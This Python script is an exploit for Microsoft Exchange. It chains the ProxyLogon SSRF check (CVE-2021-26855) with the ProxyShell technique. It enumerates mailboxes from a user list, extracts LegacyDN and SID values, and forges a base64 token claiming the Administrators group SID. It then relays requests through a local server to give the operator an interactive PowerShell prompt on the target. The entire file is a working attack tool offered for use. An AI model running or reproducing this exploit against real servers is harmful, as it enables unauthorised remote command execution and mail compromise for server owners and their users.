#!/usr/bin/env python3

import requests, re, subprocess, os, argparse, sys
import base64, struct, random, string, threading
import xml.etree.ElementTree as ET

from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial

def get_email_address(url):
	try:

		print('[*]\033[1;33m Target: \033[1;37m%s'%url)
		
		server = url + '/owa/auth.owa'
		s = requests.Session()
		server_name = ''
		X = ''
		
		try:
			req = s.post(server, verify=False, timeout=7)
			if not req.status_code == 400:
				print('\033[1;31m[-] Cant get FQDN!')
				exit(0)
			else:
				server_name = req.headers["X-FEServer"]
		except KeyError:
			print('(!) Hmm?, is that exchange server?')
			exit(0)
		
		print('(*)\033[1;33m Got FQDN:\033[1;37m %s'%(server_name))
		
		path_maybe_vuln = '/ecp/pentest.js'
		
		headers = {
		'User-Agent': 'Hello-World',
		'Cookie': 'X-BEResource={FQDN}/EWS/Exchange.asmx?a=~1942062522;'.format(FQDN=server_name),
		'Connection': 'close',
		'Content-Type': 'text/xml'
		}

		payload = """<?xml version="1.0" encoding="utf-8"?>
					<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
					xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
					xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
					xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
						<soap:Body>
							<m:GetFolder>
								<m:FolderShape>
									<t:BaseShape>Default</t:BaseShape>
								</m:FolderShape>
								<m:FolderIds>
									<t:DistinguishedFolderId Id="inbox">
										<t:Mailbox>
											<t:EmailAddress>admin@domain.tld</t:EmailAddress>
										</t:Mailbox>
									</t:DistinguishedFolderId>
								</m:FolderIds>
							</m:GetFolder>
						</soap:Body>
					</soap:Envelope>
		"""

		reqs = s.post('%s/%s' %(url,path_maybe_vuln),headers=headers,data=payload, verify=False,timeout=15)
		
		if reqs.status_code == 200:

			print('(+)\033[1;35m Target is Vuln to SSRF [CVE-2021-26855]!\033[1;37m')
			print('(+)\033[1;32m Computer Name\033[1;37m = %s'%reqs.headers["X-DiagInfo"])
			print('(+)\033[1;32m Domain Name\033[1;37m =%s'%reqs.headers["X-CalculatedBETarget"].split(',')[1])
			print('(+)\033[1;32m Guest SID\033[1;37m = %s'%reqs.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0])
			
			users = open('user.txt').read().splitlines()
						
			print('(*) Find valid mail from users list')
			
			for user in users:

				domain = reqs.headers["X-CalculatedBETarget"].split(',')[1].split('.',1)[1]

				mail_valid = '{user}@{domain}'.format(user=user, domain=domain)

				headers_for_discover = {
				"User-Agent": "Hello-World",
				"Cookie": "X-BEResource=Admin@{FQDN}:444/autodiscover/autodiscover.xml?a=~1942062522;".format(FQDN=server_name),
				"Connection": "close",
				"Content-Type": "text/xml"
				}

				autodiscover_payload = '''
				<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
				<Request>
				  <EMailAddress>{mail}</EMailAddress>
				  <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
				</Request>
				</Autodiscover>
				'''.format(mail=mail_valid)

				req = s.post('%s/%s'%(url,path_maybe_vuln), headers=headers_for_discover, data=autodiscover_payload, verify=False)
				
				if 'DisplayName' in req.text:
					print('(+) \033[1;37m%s'%(mail_valid))
					txtstr = """%s"""%(req.text)
					legacyDN = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', txtstr)
					mapi_body = legacyDN[0] + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
					mapireq = requests.post("%s/%s" % (url,path_maybe_vuln), headers={
						"Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=%s&a=~1942062522;" %(server_name, server),
						"Content-Type": "application/mapi-http",
						"X-Requesttype": "Connect",
						"X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
						"X-Clientapplication": "Outlook/15.0.4815.1002",
						"X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:500",
						"User-Agent": "Hello-World"
						},
						data=mapi_body,
						verify=False
					)

					break

		else:
			print('\033[1;37m(-) \033[0;31mTarget is not Vuln to SSRF [CVE-2021-26855]!')
	
	except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout) as e:
		print(e)
		pass

	return(mail_valid)

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
	"""Handle requests in a separate thread."""


class PwnServer(BaseHTTPRequestHandler):
	def __init__(self, proxyshell, *args, **kwargs):
		self.proxyshell = proxyshell
		super().__init__(*args, **kwargs)

	def do_POST(self):
		# From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
		powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
		length = int(self.headers['content-length'])
		content_type = self.headers['content-type']
		post_data = self.rfile.read(length).decode()
		post_data = re.sub('<wsa:To>(.*?)</wsa:To>', '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
		post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>', '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)

		headers = {
			'Content-Type': content_type
		}

		r = self.proxyshell.post(
			powershell_url,
			post_data,
			headers
		)

		resp = r.content
		self.send_response(200)
		self.end_headers()
		self.wfile.write(resp)


class ProxyShell:

	def __init__(self, exchange_url, email, verify=False):

		self.email = email
		self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
		self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
		self.sid = None
		self.legacydn = None

		self.session = requests.Session()
		self.session.verify = verify
		self.session.headers = {
			'Cookie': f'Email=autodiscover/autodiscover.json?a={self.rand_email}'
		}

	def post(self, endpoint, data, headers={}):

		url = f'{self.exchange_url}/autodiscover/autodiscover.json?a={self.rand_email}{endpoint}'
		r = self.session.post(
			url=url,
			data=data,
			headers=headers
		)
		return r

	def get_token(self):

		self.token = self.gen_token()

	def get_sid(self):

		data = self.legacydn
		data += '\x00\x00\x00\x00\x00\xe4\x04'
		data += '\x00\x00\x09\x04\x00\x00\x09'
		data += '\x04\x00\x00\x00\x00\x00\x00'

		headers = {
			"X-Requesttype": 'Connect',
			"X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
			"X-Clientapplication": 'Outlook/15.0.4815.1002',
			"X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
			'Content-Type': 'application/mapi-http'
		}

		r = self.post(
			'/mapi/emsmdb',
			data,
			headers
		)

		self.sid = r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]

	def get_legacydn(self):

		data = self.autodiscover_body()
		headers = {'Content-Type': 'text/xml'}
		r = self.post(
			'/autodiscover/autodiscover.xml',
			data,
			headers
		)

		autodiscover_xml = ET.fromstring(r.content)
		self.legacydn = autodiscover_xml.find(
			'{*}Response/{*}User/{*}LegacyDN'
		).text

	def autodiscover_body(self):

		autodiscover = ET.Element(
			'Autodiscover',
			xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
		)

		request = ET.SubElement(autodiscover, 'Request')
		ET.SubElement(request, 'EMailAddress').text = self.email
		ET.SubElement(request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'

		return ET.tostring(
			autodiscover,
			encoding='unicode',
			method='xml'
		)

	def gen_token(self):

		# From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
		version = 0
		ttype = 'Windows'
		compressed = 0
		auth_type = 'Kerberos'
		raw_token = b''
		gsid = 'S-1-5-32-544'

		version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
		type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
		compress_data = b'C' + (compressed).to_bytes(1, 'little')
		auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
		login_data = b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
		user_data = b'U' + (len(self.sid)).to_bytes(1, 'little') + self.sid.encode()
		group_data = b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
		ext_data = b'E' + struct.pack('>I', 0)

		raw_token += version_data
		raw_token += type_data
		raw_token += compress_data
		raw_token += auth_data
		raw_token += login_data
		raw_token += user_data
		raw_token += group_data
		raw_token += ext_data

		data = base64.b64encode(raw_token).decode()

		return data


def rand_string(n=5):

	return ''.join(random.choices(string.ascii_lowercase, k=n))


def exploit(proxyshell):

	proxyshell.get_legacydn()
	print(f'(+) LegacyDN: {proxyshell.legacydn}')

	proxyshell.get_sid()
	print(f'(+) SID: {proxyshell.sid}')

	proxyshell.get_token()
	print(f'(+) Token: {proxyshell.token}')


def start_server(proxyshell, port):

	handler = partial(PwnServer, proxyshell)
	server = ThreadedHTTPServer(('', port), handler)
	server_thread = threading.Thread(target=server.serve_forever)
	server_thread.daemon = True
	server_thread.start()


def shell(command, port):

	# From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
	if command.lower() in ['exit', 'quit']:
		exit()

	wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
	with RunspacePool(wsman) as pool:
		ps = PowerShell(pool)
		ps.add_script(command)
		output = ps.invoke()

	print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
	print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

def main(args):

	exchange_url = args.target
	email = get_email_address('https://'+args.target)
	local_port = args.port

	proxyshell = ProxyShell(
		exchange_url,
		email
	)

	exploit(proxyshell)
	start_server(proxyshell, local_port)

	while True:
		shell(input('PS> '), local_port)


if __name__ == '__main__':

	requests.packages.urllib3.disable_warnings(
		requests.packages.urllib3.exceptions.InsecureRequestWarning
		)
	
	## parse argument
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", action="store", help="Target domain", required=True)
	parser.add_argument("-p", "--port", help="Local wsman port", default=8000, type=int)
	args = parser.parse_args()

	if len(sys.argv[1:])==0:
		parser.print_help()
		parser.exit()

	try:
		main(args)

	except KeyboardInterrupt:
		print('\n[+] Abort')
